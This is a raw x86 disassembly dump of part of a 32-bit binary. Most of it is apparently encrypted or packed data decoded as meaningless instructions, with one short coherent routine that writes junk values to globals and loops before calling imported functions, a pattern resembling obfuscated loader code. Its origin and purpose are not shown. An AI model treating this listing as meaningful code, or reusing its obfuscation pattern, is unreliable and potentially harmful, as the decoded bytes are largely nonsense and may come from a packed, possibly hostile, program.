  40d266:	ffree  st(3)
  40d268:	sub    eax,0x8335d1ba
  40d26d:	lds    edi,FWORD PTR [edi+0x5b11ef50]
  40d273:	lea    eax,[ebx]
  40d275:	out    0x7c,al
  40d277:	adc    DWORD PTR [esi-0x786718e7],ebp
  40d27d:	in     al,dx
  40d27e:	sub    ch,BYTE PTR [edi-0x70]
  40d281:	loopne 0x40d293
  40d283:	in     eax,0x69
  40d285:	mov    ebp,0x94d78663
  40d28a:	mov    eax,ebx
  40d28c:	sub    al,0xd9
  40d28e:	gs int3 
  40d290:	pop    ebx
  40d291:	sub    DWORD PTR [ebx+ebp*4],eax
  40d294:	sbb    DWORD PTR [eax+0x7a],ebp
  40d297:	fcmovu st,st(1)
  40d299:	push   ebp
  40d29a:	and    DWORD PTR [eax+0x68],edx
  40d29d:	or     DWORD PTR [ecx+0x49],edx
  40d2a0:	sbb    bh,BYTE PTR [ecx+0x7c67b4e0]
  40d2a6:	bound  ebp,QWORD PTR ds:0xca9bfda3
  40d2ac:	and    esp,DWORD PTR [edx-0x26483854]
  40d2b2:	cmp    eax,0xd61381c0
  40d2b7:	retf   0xe2b8
  40d2ba:	aad    0x61
  40d2bc:	mov    esp,0x867624ff
  40d2c1:	in     al,0x59
  40d2c3:	nop
  40d2c4:	ret    
  40d2c5:	outs   dx,DWORD PTR ds:[esi]
  40d2c6:	ins    BYTE PTR es:[edi],dx
  40d2c7:	add    BYTE PTR [ecx+0x2d2db6da],bh
  40d2cd:	call   0x3f2f9922
  40d2d2:	pop    ebp
  40d2d3:	and    al,0xcf
  40d2d5:	adc    al,0x78
  40d2d7:	jecxz  0x40d2b7
  40d2d9:	sbb    al,0x18
  40d2dc:	xor    bl,BYTE PTR ds:0x2ac1bc81
  40d2e2:	inc    edi
  40d2e3:	jns    0x40d31e
  40d2e5:	test   dl,bh
  40d2e7:	mov    eax,0xaec4049
  40d2ec:	sub    al,0xcb
  40d2ee:	cdq    
  40d2ef:	dec    edx
  40d2f0:	adc    ebp,esp
  40d2f2:	sbb    al,0x58
  40d2f4:	clc    
  40d2f5:	sub    ch,BYTE PTR ds:0xc5d9f764
  40d2fb:	dec    ebp
  40d2fc:	xrelease mov DWORD PTR [ebp-0x6a],eax
  40d300:	dec    edx
  40d301:	mov    bh,0x3a
  40d303:	push   ebx
  40d304:	test   al,0x45
  40d306:	and    al,0x55
  40d308:	fbld   TBYTE PTR [edx+0x3f]
  40d30b:	xchg   ecx,eax
  40d30c:	outs   dx,DWORD PTR ds:[esi]
  40d30d:	in     al,dx
  40d30e:	mov    BYTE PTR [edx+0x73],ch
  40d311:	fstp   QWORD PTR [esi+0x4bd68263]
  40d317:	cmp    al,0x76
  40d319:	lds    esi,FWORD PTR [esi+edx*4+0x5ba21799]
  40d320:	xor    al,0x50
  40d322:	xor    ebx,ebx
  40d324:	mov    edx,esp
  40d326:	dec    edx
  40d327:	jmp    0x40d58a
  40d32c:	fwait
  40d32d:	push   es
  40d32e:	mov    bl,0x2a
  40d330:	mov    bl,0xab
  40d332:	mov    ds:0x57b64c97,eax
  40d337:	pop    ebx
  40d338:	les    edi,FWORD PTR [ecx+0x1d]
  40d33b:	adc    esi,DWORD PTR [eax+0x387e7e97]
  40d341:	jl     0x40d3c1
  40d343:	jle    0x40d311
  40d345:	cdq    
  40d346:	cmc    
  40d347:	add    dh,BYTE PTR [eax+ecx*4+0x4b6777f9]
  40d34e:	dec    eax
  40d34f:	lea    ecx,[esi]
  40d351:	pop    esp
  40d352:	inc    ebx
  40d353:	pop    es
  40d354:	adc    ebx,DWORD PTR [ecx]
  40d356:	ja     0x40d383
  40d358:	jne    0x40d320
  40d35a:	in     eax,dx
  40d35b:	dec    esp
  40d35c:	test   BYTE PTR [eax],bh
  40d35e:	out    dx,al
  40d35f:	mov    edx,0xeec59877
  40d364:	dec    edi
  40d365:	iret   
  40d366:	inc    ecx
  40d367:	add    bh,BYTE PTR [ebp+0x52]
  40d36a:	dec    ecx
  40d36b:	dec    edi
  40d36c:	and    eax,0xf449521b
  40d371:	mov    ds:0x4285c16a,eax
  40d376:	cli    
  40d377:	dec    edx
  40d378:	int    0xba
  40d37a:	mov    al,0x74
  40d37c:	div    eax
  40d37e:	test   DWORD PTR [edx-0x4b],0xe32dd6ca
  40d385:	mov    BYTE PTR [esi-0x18],cl
  40d388:	push   ebx
  40d389:	test   eax,0x20e56eb7
  40d38e:	fiadd  WORD PTR [edi-0x2aefd577]
  40d394:	lahf   
  40d395:	jp     0x40d3ef
  40d397:	or     bh,dh
  40d399:	adc    al,0xdf
  40d39b:	push   ebp
  40d39c:	inc    esp
  40d39d:	mov    ecx,0xe2928cb7
  40d3a2:	test   eax,0x3018b6b0
  40d3a7:	sar    al,cl
  40d3a9:	in     eax,0x2f
  40d3ab:	xor    al,0x28
  40d3ad:	xchg   BYTE PTR [esi+0x12],ch
  40d3b0:	adc    BYTE PTR [ebx],bh
  40d3b2:	shl    BYTE PTR [ebx+0x5c5545cc],0xbf
  40d3b9:	cmp    eax,0xe2393ec0
  40d3be:	mov    edi,DWORD PTR [esi+0x6b79d3e0]
  40d3c4:	cli    
  40d3c5:	xchg   ebp,eax
  40d3c6:	(bad)  [ebp-0x7f]
  40d3c9:	push   eax
  40d3ca:	fsubp  st(0),st
  40d3cc:	jg     0x40d3ba
  40d3ce:	mov    cl,0x3f
  40d3d0:	inc    edi
  40d3d1:	jecxz  0x40d3ac
  40d3d3:	inc    edi
  40d3d4:	sub    al,BYTE PTR [ecx-0x2f]
  40d3d7:	fnsave ds:0xdcae9ab4
  40d3dd:	ins    BYTE PTR es:[edi],dx
  40d3de:	test   esi,eax
  40d3e0:	cli    
  40d3e1:	jecxz  0x40d3de
  40d3e3:	fist   WORD PTR [ebx]
  40d3e5:	adc    BYTE PTR [eax+eiz*1-0x8],cl
  40d3e9:	aam    0x5b
  40d3eb:	sbb    eax,0xd6ec7ec
  40d3f0:	stc    
  40d3f1:	test   eax,0xcf09efaf
  40d3f6:	inc    ebp
  40d3f7:	xlat   BYTE PTR ds:[ebx]
  40d3f8:	adc    bl,BYTE PTR [eax]
  40d3fa:	loop   0x40d40f
  40d3fc:	pusha  
  40d3fd:	xchg   ecx,eax
  40d3fe:	mov    DWORD PTR [esi],ebx
  40d400:	dec    edi
  40d401:	cmc    
  40d402:	es mov ebx,0x3525391d
  40d408:	mov    al,ds:0x275a51ea
  40d40d:	sub    bl,ch
  40d40f:	lock inc eax
  40d411:	add    al,0x6b
  40d413:	sub    bl,BYTE PTR [ecx+0x55c9065a]
  40d419:	retf   0xcee6
  40d41c:	xchg   dh,dh
  40d41e:	sbb    ecx,esi
  40d420:	scas   eax,DWORD PTR es:[edi]
  40d421:	in     eax,0xf2
  40d423:	mov    eax,ds:0xadf9860
  40d428:	dec    ebx
  40d429:	ret    
  40d42a:	loop   0x40d458
  40d42c:	stos   BYTE PTR es:[edi],al
  40d42d:	and    al,0x1a
  40d42f:	nop
  40d430:	inc    eax
  40d431:	inc    ebx
  40d432:	xchg   esi,eax
  40d433:	hlt    
  40d434:	and    eax,0x4b400eb1
  40d439:	xchg   esp,eax
  40d43a:	outs   dx,DWORD PTR ds:[esi]
  40d43b:	rcl    DWORD PTR [ecx-0x3e],1
  40d43e:	(bad)  [esi+0x6]
  40d441:	lods   al,BYTE PTR ds:[esi]
  40d442:	jmp    0x9565eb01
  40d447:	adc    BYTE PTR [ecx+0x2df091a7],0xce
  40d44e:	dec    ebx
  40d44f:	fsubr  QWORD PTR [edi+edx*4]
  40d452:	mov    ecx,0x38a6baba
  40d457:	cmp    bh,BYTE PTR [edi+0x1]
  40d45a:	mov    eax,DWORD PTR [esp+edi*4]
  40d45d:	outs   dx,BYTE PTR ds:[esi]
  40d45e:	jb     0x40d474
  40d460:	pop    ebx
  40d461:	jl     0x40d4e0
  40d463:	cwde   
  40d464:	mov    eax,0x54f8834b
  40d469:	arpl   WORD PTR [eax+0x3b],di
  40d46c:	cmc    
  40d46d:	sub    al,dh
  40d46f:	adc    DWORD PTR ds:0x6b89d5b3,ebx
  40d475:	dec    ebp
  40d476:	das    
  40d477:	and    eax,DWORD PTR [ecx]
  40d479:	retf   
  40d47a:	sub    esi,DWORD PTR [ebp-0x7a]
  40d47d:	(bad)  
  40d47e:	rcr    DWORD PTR ds:0x82dd9bf5,1
  40d484:	(bad)  
  40d485:	lds    ecx,FWORD PTR [eax]
  40d487:	xor    BYTE PTR [ecx-0x22],dl
  40d48a:	js     0x40d4a8
  40d48c:	ret    
  40d48d:	cmp    bl,dh
  40d48f:	mov    DWORD PTR [ebp-0x76],esi
  40d492:	pop    ds
  40d493:	and    ebp,ecx
  40d495:	mov    al,0xaf
  40d497:	jae    0x40d479
  40d499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d49a:	fcomp  QWORD PTR [edi-0x77dc04b9]
  40d4a0:	jg     0x40d4df
  40d4a2:	jl     0x40d46d
  40d4a4:	fwait
  40d4a5:	leave  
  40d4a6:	mov    es,ebx
  40d4a8:	jnp    0x40d4ba
  40d4aa:	stc    
  40d4ab:	in     al,dx
  40d4ac:	mov    ch,0xc3
  40d4ae:	ficomp WORD PTR [ecx-0x3c]
  40d4b1:	push   esi
  40d4b2:	lods   eax,DWORD PTR ds:[esi]
  40d4b3:	xchg   bl,ch
  40d4b5:	or     BYTE PTR [ebx-0x36],bl
  40d4b8:	cdq    
  40d4b9:	or     al,0x28
  40d4bb:	xor    BYTE PTR [edi+ecx*2-0x10db7f30],al
  40d4c2:	repz mov ah,0x4c
  40d4c5:	xchg   ebp,eax
  40d4c6:	dec    ebx
  40d4c7:	xlat   BYTE PTR ds:[ebx]
  40d4c8:	pop    ebp
  40d4c9:	or     BYTE PTR [edx],0x9c
  40d4cc:	push   ss
  40d4cd:	imul   eax,DWORD PTR [esp+edx*4],0x3e
  40d4d1:	mov    ch,0xf2
  40d4d3:	xor    al,0x59
  40d4d5:	mov    esp,DWORD PTR [eax-0x5a6d8a2]
  40d4db:	adc    ch,BYTE PTR [eax]
  40d4dd:	aaa    
  40d4de:	(bad)  
  40d4df:	or     BYTE PTR [ebx-0x3e08c37e],ah
  40d4e5:	fsub   DWORD PTR [ecx+0x3f]
  40d4e8:	(bad)  
  40d4e9:	mov    ecx,0xa083dbb9
  40d4ee:	jnp    0x40d498
  40d4f0:	das    
  40d4f1:	cmp    dh,BYTE PTR [edx]
  40d4f3:	jecxz  0x40d4d0
  40d4f5:	mov    al,0x24
  40d4f7:	cli    
  40d4f8:	cmp    BYTE PTR [edx+0x52909f34],al
  40d4fe:	mov    ebx,0x4d88a2d3
  40d503:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d504:	out    dx,eax
  40d505:	jb     0x40d4e2
  40d507:	sbb    DWORD PTR [edi],ebp
  40d509:	jne    0x40d516
  40d50b:	xchg   edx,eax
  40d50c:	jb     0x40d542
  40d50e:	arpl   di,si
  40d510:	fild   DWORD PTR [eax]
  40d512:	jae    0x40d4e1
  40d514:	mov    dl,0xab
  40d516:	in     al,dx
  40d517:	hlt    
  40d518:	xor    DWORD PTR [eax+0x6767a16b],ebp
  40d51e:	push   esp
  40d51f:	repnz push cs
  40d521:	inc    edi
  40d522:	pop    es
  40d523:	(bad)
  40d526:	lds    edi,FWORD PTR [ebp+0x78e07d38]
  40d52c:	call   0x8388107c
  40d531:	xchg   esi,eax
  40d532:	or     eax,0xc3265cc4
  40d537:	push   0xffffffec
  40d539:	fwait
  40d53a:	pop    ax
  40d53c:	and    eax,DWORD PTR [esp+esi*2+0x67f3755a]
  40d543:	pop    edi
  40d544:	mov    WORD PTR [edi+0x5e4ec8a8],?
  40d54a:	retf   0x4ba7
  40d54d:	jmp    0x9d88:0xc07cf4c7
  40d554:	ja     0x40d596
  40d556:	aad    0x3f
  40d558:	call   0x7fb97b7b
  40d55d:	adc    al,0xbe
  40d55f:	mov    ch,0xf1
  40d561:	jmp    0x40d56f
  40d563:	pop    eax
  40d564:	scas   al,BYTE PTR es:[edi]
  40d565:	mov    al,0x38
  40d567:	jo     0x40d59d
  40d569:	jne    0x40d562
  40d56b:	enter  0x1794,0xe4
  40d56f:	pop    ecx
  40d570:	sub    eax,0xab65227
  40d575:	fadd   DWORD PTR [esi+0x1a07907]
  40d57b:	or     bl,BYTE PTR [ebx]
  40d57d:	clc    
  40d57e:	or     DWORD PTR [esp+esi*8+0x14],0xd6dba618
  40d586:	mov    eax,ds:0x4326ab5e
  40d58b:	add    ebx,DWORD PTR [edx+ebx*1]
  40d58e:	dec    ebx
  40d58f:	xor    edx,edx
  40d591:	add    DWORD PTR [ebp-0xc],ebx
  40d594:	pop    ebx
  40d595:	mov    eax,DWORD PTR [ebp-0xc]
  40d598:	pop    edi
  40d599:	pop    esi
  40d59a:	pop    ebx
  40d59b:	leave  
  40d59c:	ret    0x10
  40d59f:	push   ebp
  40d5a0:	mov    ebp,esp
  40d5a2:	push   ecx
  40d5a3:	not    eax
  40d5a5:	push   ecx
  40d5a6:	mov    eax,0xf89c8532
  40d5ab:	mov    DWORD PTR ds:0x4336a3,ecx
  40d5b1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d5b8:	mov    DWORD PTR ds:0x433697,edx
  40d5be:	push   esi
  40d5bf:	mov    DWORD PTR ds:0x43369b,0x1f1b
  40d5c9:	mov    DWORD PTR [ebp-0x8],eax
  40d5cc:	mov    DWORD PTR ds:0x4336a7,0x659
  40d5d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5d9:	push   edi
  40d5da:	not    edi
  40d5dc:	mov    edi,0x7510854
  40d5e1:	not    DWORD PTR ds:0x4336e3
  40d5e7:	mov    esi,0x32729b
  40d5ec:	mov    DWORD PTR ds:0x43369b,0x27d6
  40d5f6:	cmp    ecx,eax
  40d5f8:	mov    DWORD PTR ds:0x433727,0x52ab
  40d602:	je     0x40d94e
  40d608:	mov    eax,DWORD PTR [ebp-0x4]
  40d60b:	mov    ecx,DWORD PTR [ebp+0xc]
  40d60e:	sub    DWORD PTR ds:0x43372f,0x32
  40d618:	xor    eax,edi
  40d61a:	add    eax,esi
  40d61c:	mov    DWORD PTR ds:0x43365b,0x51fb
  40d626:	cmp    eax,ecx
  40d628:	mov    DWORD PTR ds:0x4336db,0x5a
  40d632:	je     0x40d94e
  40d638:	and    DWORD PTR ds:0x433717,0x0
  40d642:	mov    edx,DWORD PTR ds:0x433717
  40d648:	inc    edx
  40d649:	mov    DWORD PTR ds:0x433717,edx
  40d64f:	cmp    DWORD PTR ds:0x433717,0x25
  40d656:	jne    0x40d665
  40d65c:	push   DWORD PTR [ebp-0xc]
  40d65f:	call   DWORD PTR ds:0x4122a8
  40d665:	cmp    DWORD PTR ds:0x433717,0x18
  40d66c:	jb     0x40d642
  40d672:	and    DWORD PTR ds:0x433663,0x0
  40d67c:	xor    edx,edx
  40d67e:	add    edx,DWORD PTR ds:0x433663
  40d684:	inc    edx
  40d685:	mov    DWORD PTR ds:0x433663,edx
  40d68b:	cmp    DWORD PTR ds:0x433663,0x1c
  40d692:	jne    0x40d6a3
  40d698:	push   0x433753
  40d69d:	call   DWORD PTR ds:0x412360
  40d6a3:	cmp    DWORD PTR ds:0x433663,0x1b
  40d6aa:	jb     0x40d67c
  40d6b0:	movzx  eax,BYTE PTR ds:0x433667
  40d6b7:	add    eax,DWORD PTR ds:0x43369b
  40d6bd:	mov    ds:0x433667,eax
  40d6c2:	mov    eax,DWORD PTR [ebp-0x4]
  40d6c5:	xor    eax,edi
  40d6c7:	add    eax,esi
  40d6c9:	push   eax
  40d6ca:	push   DWORD PTR [ebp-0x8]
  40d6cd:	push   DWORD PTR [ebp-0x4]
  40d6d0:	mov    edx,DWORD PTR ds:0x413b34
  40d6d6:	call   0x4057b9
  40d6db:	mov    ecx,DWORD PTR ds:0x413b34
  40d6e1:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40d6e7:	jmp    0x40d944
  40d6ec:	mov    esi,0x704a1816
  40d6f1:	jo     0x40d75f
  40d6f3:	adc    al,BYTE PTR ds:0xe9a0482a
  40d6f9:	adc    al,0xed
  40d6fb:	xchg   ecx,eax
  40d6fc:	jp     0x40d690
  40d6fe:	jle    0x40d77e
  40d700:	ds jl  0x40d781
  40d703:	jle    0x40d6fa
  40d705:	mov    edx,0x6d995959
  40d70a:	fcmovb st,st(1)
  40d70c:	push   esi
  40d70d:	sub    edi,DWORD PTR [esi+0x22]
  40d710:	inc    ebp
  40d711:	mov    gs,WORD PTR [ebx-0x27]
  40d714:	jne    0x40d706
  40d716:	cmp    al,0xf4
  40d718:	bound  ebp,QWORD PTR [eax+0x4b8f74e]
  40d71e:	or     ebx,DWORD PTR [esi+0x22]
  40d721:	sbb    DWORD PTR [edx+0x4d],ecx
  40d724:	inc    edx
  40d725:	mov    dh,0xdb
  40d727:	xchg   ebp,eax
  40d728:	jno    0x40d742
  40d72a:	sbb    ebx,DWORD PTR [edi]
  40d72c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d72d:	fist   WORD PTR [edi+0x36f06242]
  40d733:	add    eax,0x9734ca4d
  40d738:	pushf  
  40d739:	ins    BYTE PTR es:[edi],dx
  40d73a:	retf   
  40d73b:	sub    edi,DWORD PTR [ebx-0x7d]
  40d73e:	mov    WORD PTR [eax+0x71d849a2],?
  40d744:	xor    DWORD PTR [ebp+eax*4+0x13e1d294],0x21
  40d74c:	inc    ebx
  40d74d:	pop    ss
  40d74e:	pop    edi
  40d74f:	add    DWORD PTR [ebx-0x27fc3c9a],ebx
  40d755:	gs jl  0x40d730
  40d758:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d759:	push   ebx
  40d75a:	dec    edx
  40d75b:	sbb    eax,0xb0c1a214
  40d760:	xor    al,0xd7
  40d762:	fcomi  st,st(6)
  40d764:	lds    edi,FWORD PTR [esi+0x5c97cd86]
  40d76a:	adc    esp,DWORD PTR [ebx-0x7c]
  40d76d:	and    BYTE PTR ds:0x4f836f9b,bh
  40d773:	cmp    al,0xde
  40d775:	and    eax,0xc3bfc9b9
  40d77a:	cmp    DWORD PTR ds:0x2646bb4b,ebx
  40d780:	cmc    
  40d781:	or     eax,0x2a698b09
  40d786:	in     eax,dx
  40d787:	sbb    DWORD PTR [esi-0x7fa316de],esi
  40d78d:	xrelease mov DWORD PTR [esi],edx
  40d790:	out    dx,eax
  40d791:	ins    BYTE PTR es:[edi],dx
  40d792:	and    al,bl
  40d794:	fst    QWORD PTR [ecx+0x73587f4f]
  40d79a:	rcr    DWORD PTR ds:0x54914272,0xc
  40d7a1:	mov    edx,0xf9df40dc
  40d7a6:	shl    ch,1
  40d7a8:	or     cl,BYTE PTR [ebp-0x14]
  40d7ab:	stos   BYTE PTR es:[edi],al
  40d7ac:	jo     0x40d7fd
  40d7ae:	cs dec ebp
  40d7b0:	pop    ebp
  40d7b1:	mov    cl,0xc5
  40d7b3:	ds jl  0x40d834
  40d7b6:	adc    DWORD PTR [eax-0x25312720],esi
  40d7bc:	mov    edx,0xcfecfb84
  40d7c1:	js     0x40d834
  40d7c3:	daa    
  40d7c4:	mov    ds:0x1fb636d,eax
  40d7c9:	rcr    BYTE PTR [eax],0xbc
  40d7cc:	popf   
  40d7cd:	push   edx
  40d7ce:	in     al,dx
  40d7cf:	(bad)  
  40d7d0:	push   eax
  40d7d1:	ins    BYTE PTR es:[edi],dx
  40d7d2:	pop    edi
  40d7d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7d4:	xor    dl,BYTE PTR [esi-0xbdb877e]
  40d7da:	xchg   BYTE PTR [edx+eax*8],dl
  40d7dd:	push   ss
  40d7de:	xchg   DWORD PTR [ecx-0x6c],eax
  40d7e1:	scas   al,BYTE PTR es:[edi]
  40d7e2:	repz stc 
  40d7e4:	jbe    0x40d777
  40d7e6:	cmp    eax,0x950ba9d3
  40d7eb:	sub    ecx,DWORD PTR [edx-0x2c]
  40d7ee:	retf   0x25cf
  40d7f1:	add    al,0xc4
  40d7f3:	mov    ch,0x79
  40d7f5:	sub    al,0xeb
  40d7f7:	inc    esp
  40d7f8:	pop    edx
  40d7f9:	psadbw mm2,QWORD PTR [edi+0x2201d28]
  40d800:	mov    ch,0x7f
  40d802:	xlat   BYTE PTR ds:[ebx]
  40d803:	ja     0x40d787
  40d805:	sar    DWORD PTR [esi+0x5b],1
  40d808:	arpl   WORD PTR ds:0x60047660,bx
  40d80e:	out    dx,al
  40d80f:	mov    dh,0xbe
  40d811:	neg    BYTE PTR [ebp-0x1a]
  40d814:	cmp    esi,ecx
  40d816:	aaa    
  40d817:	js     0x40d7fa
  40d819:	jmp    0x5469:0x7d57797c
  40d820:	loop   0x40d7e1
  40d822:	fistp  WORD PTR [ebx+0x11]
  40d825:	(bad)  
  40d826:	xchg   ebx,eax
  40d827:	(bad)  
  40d828:	loope  0x40d839
  40d82a:	cmp    BYTE PTR [ecx],ah
  40d82c:	xor    al,0xc4
  40d82e:	cmp    ecx,eax
  40d830:	jo     0x40d7e3
  40d832:	push   ecx
  40d833:	xor    esi,DWORD PTR [ecx-0x17]
  40d836:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d837:	dec    ecx
  40d838:	int    0x47
  40d83a:	mov    eax,ds:0x69a457eb
  40d83f:	fimul  WORD PTR [esi+0x3fa8c5aa]
  40d845:	dec    esi
  40d846:	out    dx,al
  40d847:	inc    ebx
  40d848:	sbb    edx,DWORD PTR [ebx+0x1f]
  40d84b:	mov    dl,BYTE PTR [ebx+0x37]
  40d84e:	push   edx
  40d84f:	cmc    
  40d850:	add    DWORD PTR [ecx],eax
  40d852:	push   edx
  40d853:	pusha  
  40d854:	shr    BYTE PTR [ebx+esi*1+0x457fc5bf],1
  40d85b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d85c:	add    ebx,DWORD PTR [ebx-0x3e]
  40d85f:	or     al,0xc7
  40d861:	jl     0x40d80f
  40d863:	aad    0x68
  40d865:	push   eax
  40d866:	mov    BYTE PTR [esi],al
  40d868:	stos   BYTE PTR es:[edi],al
  40d869:	sti    
  40d86a:	mov    eax,0xd3dd0dbb
  40d86f:	nop
  40d870:	ss out dx,eax
  40d872:	fwait
  40d873:	cmp    DWORD PTR [edx+0x5d],0xe2997df0
  40d87a:	mov    ch,0x66
  40d87c:	push   ecx
  40d87d:	ins    DWORD PTR es:[edi],dx
  40d87e:	mov    DWORD PTR [ebx-0xa265557],0xd0ce3e5
  40d888:	sahf   
  40d889:	mov    DWORD PTR [ebx+0x5213e094],ebx
  40d88f:	mov    al,0x35
  40d891:	js     0x40d891
  40d893:	test   eax,0xfd4c5aee
  40d898:	(bad)  
  40d899:	stc    
  40d89a:	or     DWORD PTR [esi+0x18],0xffffff8a
  40d89e:	mov    BYTE PTR [edx],dh
  40d8a0:	pop    eax
  40d8a1:	jg     0x40d8e1
  40d8a3:	dec    ebp
  40d8a4:	pop    ebp
  40d8a5:	push   ss
  40d8a6:	sbb    DWORD PTR [ecx],0x5a
  40d8a9:	fbld   TBYTE PTR ds:0x5e0e2509
  40d8af:	test   BYTE PTR [esi-0x7cac82b0],bl
  40d8b5:	pusha  
  40d8b6:	rol    DWORD PTR [edx],0xb4
  40d8b9:	sub    BYTE PTR fs:[eax],al
  40d8bc:	xchg   esp,eax
  40d8bd:	sub    BYTE PTR [esi+0x2b],ah
  40d8c0:	fisubr WORD PTR [ecx]
  40d8c2:	pop    ebp
  40d8c3:	inc    ebp
  40d8c4:	push   edi
  40d8c5:	xchg   edx,eax
  40d8c6:	lds    esi,FWORD PTR [ebx-0x17d33ead]
  40d8cc:	and    BYTE PTR [edi+0x73cc8116],dl
  40d8d2:	mov    ah,BYTE PTR [eax]
  40d8d4:	or     al,0xd1
  40d8d6:	ins    DWORD PTR es:[edi],dx
  40d8d7:	ins    DWORD PTR es:[edi],dx
  40d8d8:	call   0x29145012
  40d8dd:	test   eax,0x86d676ca
  40d8e2:	push   es
  40d8e3:	popa   
  40d8e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8e5:	enter  0x5437,0x90
  40d8e9:	mov    edi,0x57095152
  40d8ee:	(bad)  
  40d8ef:	retf   0x5eb0
  40d8f2:	add    al,0xae
  40d8f4:	data16 ins BYTE PTR es:[edi],dx
  40d8f6:	cmp    BYTE PTR [ebp+0xf04d235],bl
  40d8fc:	(bad)  
  40d8fd:	sub    ah,BYTE PTR [ebp-0x2b257f7c]
  40d903:	pop    ebx
  40d904:	and    ebx,DWORD PTR [ebp+0xe]
  40d907:	je     0x40d905
  40d909:	(bad)  
  40d90a:	sbb    eax,0x80528258
  40d90f:	mov    edx,0xc6888a89
  40d914:	jne    0x40d962
  40d916:	test   al,0xbf
  40d918:	jb     0x40d942
  40d91a:	adc    ebp,DWORD PTR [edx+0x13]
  40d91d:	fdiv   QWORD PTR [ebp+0x4397dea1]
  40d923:	mov    edi,0xe0321073
  40d928:	adc    eax,0x812a0d2c
  40d92d:	push   ebp
  40d92e:	push   ds
  40d92f:	test   eax,ebx
  40d931:	xchg   ecx,eax
  40d932:	mov    al,ds:0xf2dd0f58
  40d937:	and    esp,DWORD PTR [ebx+0x7043335]
  40d93d:	sub    eax,0xf8989a55
  40d942:	add    ebx,ebx
  40d944:	mov    DWORD PTR [ecx],eax
  40d946:	mov    eax,DWORD PTR [ebp-0x8]
  40d949:	jmp    0x40de40
  40d94e:	mov    eax,DWORD PTR [ebp-0x4]
  40d951:	mov    ecx,DWORD PTR [ebp+0x10]
  40d954:	xor    eax,edi
  40d956:	add    eax,esi
  40d958:	jmp    0x40dbb5
  40d95d:	or     DWORD PTR [ebx+0x1f],0x4172f5e2
  40d964:	imul   ebx,DWORD PTR [ecx],0x8c2b51ed
  40d96a:	(bad)  
  40d96b:	outs   dx,DWORD PTR ds:[esi]
  40d96c:	cmp    BYTE PTR [edx],0x90
  40d96f:	jle    0x40d9ef
  40d971:	ds jl  0x40d9f2
  40d974:	jle    0x40d983
  40d976:	addr16 test al,0xd3
  40d979:	aad    0xdc
  40d97b:	popf   
  40d97c:	inc    ebx
  40d97d:	mov    bl,0xbd
  40d97f:	jmp    edx
  40d981:	(bad)  
  40d984:	(bad)
  40d988:	scas   al,BYTE PTR es:[edi]
  40d989:	shr    dl,1
  40d98b:	je     0x40d941
  40d98d:	cmp    edx,0x8b500ed1
  40d993:	cmp    DWORD PTR [ebp+edi*8-0x2795664b],0x5ea75b7e
  40d99e:	enter  0x3de7,0x48
  40d9a2:	mov    dh,0x9f
  40d9a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9a5:	ret    
  40d9a6:	jns    0x40d9ae
  40d9a8:	add    DWORD PTR ds:0xb2e73aca,0x73
  40d9af:	add    al,0xc5
  40d9b1:	xor    ah,BYTE PTR [edi+ecx*4+0x7077ad00]
  40d9b8:	test   al,0x3d
  40d9ba:	hlt    
  40d9bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9bc:	lods   eax,DWORD PTR ds:[esi]
  40d9bd:	mov    ebp,0x916bb5a1
  40d9c2:	cs sbb eax,0xb37b736e
  40d9c8:	out    0x8e,eax
  40d9ca:	inc    ebp
  40d9cb:	mov    ch,0x0
  40d9cd:	loopne 0x40d9d5
  40d9cf:	ja     0x40d99a
  40d9d1:	adc    DWORD PTR [eax+0x155a41a8],ebx
  40d9d7:	dec    ebx
  40d9d8:	mov    al,ds:0xe62164f
  40d9dd:	push   es
  40d9de:	mov    esp,0x5c53a1bb
  40d9e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9e4:	adc    DWORD PTR [edx+0x5e5de1ce],ebp
  40d9ea:	inc    eax
  40d9eb:	stos   BYTE PTR es:[edi],al
  40d9ec:	sub    eax,0x742d39ca
  40d9f1:	sub    eax,DWORD PTR [edx]
  40d9f3:	arpl   WORD PTR [esi],cx
  40d9f5:	sbb    eax,0x366c5a8
  40d9fa:	sbb    DWORD PTR [edx+0xb8e0d54],esi
  40da00:	fdivr  st(5),st
  40da02:	mov    bl,0x93
  40da04:	pop    DWORD PTR [ebx+0x735105e9]
  40da0a:	fucomi st,st(6)
  40da0c:	mov    esi,0xfb62ff69
  40da11:	xlat   BYTE PTR ds:[ebx]
  40da12:	lahf   
  40da13:	pop    ds
  40da14:	jge    0x40d9bc
  40da16:	sub    dl,al
  40da18:	cmp    DWORD PTR [esi-0x25c08d90],ebp
  40da1e:	jge    0x40da27
  40da20:	push   ecx
  40da21:	loop   0x40d9e6
  40da23:	cld    
  40da24:	mov    cl,0x1
  40da26:	mov    ebx,DWORD PTR [edx-0x28]
  40da29:	xor    BYTE PTR [edi+ecx*2-0x4f],ah
  40da2d:	inc    ebp
  40da2e:	jmp    0x40d9f3
  40da30:	aad    0x48
  40da32:	pop    edx
  40da33:	data16 xlat BYTE PTR ds:[ebx]
  40da35:	jno    0x40d9cf
  40da37:	xor    DWORD PTR [edi],ebp
  40da39:	ss push ss
  40da3b:	(bad)  
  40da3c:	fdivr  st(1),st
  40da3e:	retf   
  40da3f:	jae    0x40d9fe
  40da41:	mov    dl,BYTE PTR [ecx]
  40da43:	test   ebx,eax
  40da45:	sti    
  40da46:	sbb    ebx,0xffffffe3
  40da49:	sub    BYTE PTR [edx+ebx*4],cl
  40da4c:	leave  
  40da4d:	xchg   ebp,eax
  40da4e:	and    eax,esp
  40da50:	or     dl,BYTE PTR [edi+0x49ad3bb5]
  40da56:	push   ebx
  40da57:	(bad)  
  40da58:	xchg   ebx,eax
  40da59:	out    dx,al
  40da5a:	ins    DWORD PTR es:[edi],dx
  40da5b:	cmp    eax,0x3e0c856d
  40da60:	fcomp  QWORD PTR [edx]
